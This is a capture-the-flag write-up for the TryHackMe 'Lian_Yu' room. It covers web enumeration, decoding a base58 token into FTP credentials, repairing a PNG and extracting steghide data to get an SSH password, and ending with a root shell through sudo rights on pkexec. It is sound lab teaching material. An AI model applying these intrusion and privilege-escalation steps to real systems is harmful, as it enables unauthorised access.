---
tags:
  - THM
  - Linux
  - Easy
  - Leakage
  - Stego
  - Sudo
---
https://tryhackme.com/room/lianyu/
# Add Hosts
Append to the `/etc/hosts` file:
```text
10.10.162.101 lianyu.thm
```
# Scanning
```console
$ nmap -p21,22,80,111,47342 -sV -sC lianyu.thm

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.2
22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u8 (protocol 2.0)
| ssh-hostkey: 
|   1024 56:50:bd:11:ef:d4:ac:56:32:c3:ee:73:3e:de:87:f4 (DSA)
|   2048 39:6f:3a:9c:b6:2d:ad:0c:d8:6d:be:77:13:07:25:d6 (RSA)
|   256 a6:69:96:d7:6d:61:27:96:7e:bb:9f:83:60:1b:52:12 (ECDSA)
|_  256 3f:43:76:75:a8:5a:a6:cd:33:b0:66:42:04:91:fe:a0 (ED25519)
80/tcp    open  http    Apache httpd
|_http-title: Purgatory
|_http-server-header: Apache
111/tcp   open  rpcbind 2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100024  1          42905/tcp6  status
|   100024  1          47342/tcp   status
|   100024  1          53165/udp   status
|_  100024  1          55502/udp6  status
47342/tcp open  status  1 (RPC #100024)
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
# Enumeration
## Website
Discovered [island/](http://lianyu.thm/island/) directory:
```console
$ gobuster dir -q -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://lianyu.thm/

/island               (Status: 301) [Size: 233] [--> http://lianyu.thm/island/]
```
Found **user vigilante**.
`curl -s http://lianyu.thm/island/ | sed -r '/^\s*$/d'`:
```html
<!DOCTYPE html>
<html>
<body>
<style>
</style>
<h1> Ohhh Noo, Don't Talk............... </h1>
<p> I wasn't Expecting You at this Moment. I will meet you there </p><!-- go!go!go! -->
<p>You should find a way to <b> Lian_Yu</b> as we are planed. The Code Word is: </p><h2 style="color:white"> vigilante</style></h2>
</body>
</html>
```
Discovered [island/2100/](http://lianyu.thm/island/2100/) directory:
```console
$ gobuster dir -q -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://lianyu.thm/island/

/2100                 (Status: 301) [Size: 238] [--> http://lianyu.thm/island/2100/]
```
HTML comment is mentioning `.ticket` file extension.
`curl -s http://lianyu.thm/island/2100/index.html`:
```html
<!DOCTYPE html>
<html>
<body>

<h1 align=center>How Oliver Queen finds his way to Lian_Yu?</h1>


<p align=center >
<iframe width="640" height="480" src="https://www.youtube.com/embed/X8ZiFuW41yY">
</iframe> <p>
<!-- you can avail your .ticket here but how?   -->

</header>
</body>
</html>
```
Discovered [island/2100/green_arrow.ticket](http://lianyu.thm/island/2100/green_arrow.ticket) file:
```console
$ gobuster dir -q -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -u http://lianyu.thm/island/2100/ -x ticket

/green_arrow.ticket   (Status: 200) [Size: 71]
```
Found a **base58-encoded token**:
```
$ curl -s http://lianyu.thm/island/2100/green_arrow.ticket

This is just a token to get into Queen's Gambit(Ship)


RTy8yhBQdscX
```
Decoded the **token** using [CyberChef](https://gchq.github.io/CyberChef/#recipe=From_Base58('123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz',true)&input=UlR5OHloQlFkc2NY): `!#th3h00d`.
## FTP
Log in as **user vigilante** via FTP:
```console
$ ftp -i lianyu.thm

Connected to lianyu.thm.
220 (vsFTPd 3.0.2)
Name (lianyu.thm:kali): vigilante
331 Please specify the password.
Password: !#th3h00d
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
```
List and download some files:
```console
ftp> ls -la
200 PORT command successful. Consider using PASV.
150 Here comes the directory listing.
drwxr-xr-x    2 1001     1001         4096 May 05  2020 .
drwxr-xr-x    4 0        0            4096 May 01  2020 ..
-rw-------    1 1001     1001           44 May 01  2020 .bash_history
-rw-r--r--    1 1001     1001          220 May 01  2020 .bash_logout
-rw-r--r--    1 1001     1001         3515 May 01  2020 .bashrc
-rw-r--r--    1 0        0            2483 May 01  2020 .other_user
-rw-r--r--    1 1001     1001          675 May 01  2020 .profile
-rw-r--r--    1 0        0          511720 May 01  2020 Leave_me_alone.png
-rw-r--r--    1 0        0          549924 May 05  2020 Queen's_Gambit.png
-rw-r--r--    1 0        0          191026 May 01  2020 aa.jpg
226 Directory send OK.

ftp> mget .other_user *.png aa.jpg
```
# Steganography
Found **user slade** inside `.other_user`:
```console
$ head -n 1 .other_user

Slade Wilson was 16 years old when he enlisted in the United States Army, having lied about his age. After serving a stint in Korea, he was later assigned to Camp Washington where he had been promoted to the rank of major. In the early 1960s, he met Captain Adeline Kane, who was tasked with training young soldiers in new fighting techniques in anticipation of brewing troubles taking place in Vietnam. Kane was amazed at how skilled Slade was and how quickly he adapted to modern conventions of warfare. She immediately fell in love with him and realized that he was without a doubt the most able-bodied combatant that she had ever encountered. She offered to privately train Slade in guerrilla warfare. In less than a year, Slade mastered every fighting form presented to him and was soon promoted to the rank of lieutenant colonel. Six months later, Adeline and he were married and she became pregnant with their first child. The war in Vietnam began to escalate and Slade was shipped overseas. In the war, his unit massacred a village, an event which sickened him. He was also rescued by SAS member Wintergreen, to whom he would later return the favor.
```
## Corrupted image
Can not open image `Leave_me_alone.png` due to corruption.

Modify `Leave_me_alone.png` to start with the PNG file signature `89 50 4E 47 0D 0A 1A 0A`:
```console
$ hexedit Leave_me_alone.png

^X
```
Now, the image `Leave_me_alone.png` displays the **password** `password`.
## ZIP file
Discovered a **protected zip file** `ss.zip` inside `aa.jpg`:
```console
$ steghide extract -sf aa.jpg -p password

wrote extracted data to "ss.zip".
```
Extracted files `passwd.txt` and `shado`:
```console
$ unzip ss.zip

Archive:  ss.zip
  inflating: passwd.txt              
  inflating: shado
```
Found a **password** inside `shado`:
```console
$ cat shado

M3tahuman
```
# Connection
Log in via SSH as **user slade**:
```bash
ssh slade@lianyu.thm
```
Get **user flag**:
```bash
cat /home/slade/user.txt
```
# Post-Exploitation
Can run `/usr/bin/pkexec` as **root** with **sudo**:
```console
$ sudo -l

Matching Defaults entries for slade on LianYu:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User slade may run the following commands on LianYu:
    (root) PASSWD: /usr/bin/pkexec
```
Spawn a **root shell**:
```bash
sudo /usr/bin/pkexec /bin/bash
```
Get **root flag**:
```bash
cat /root/root.txt
```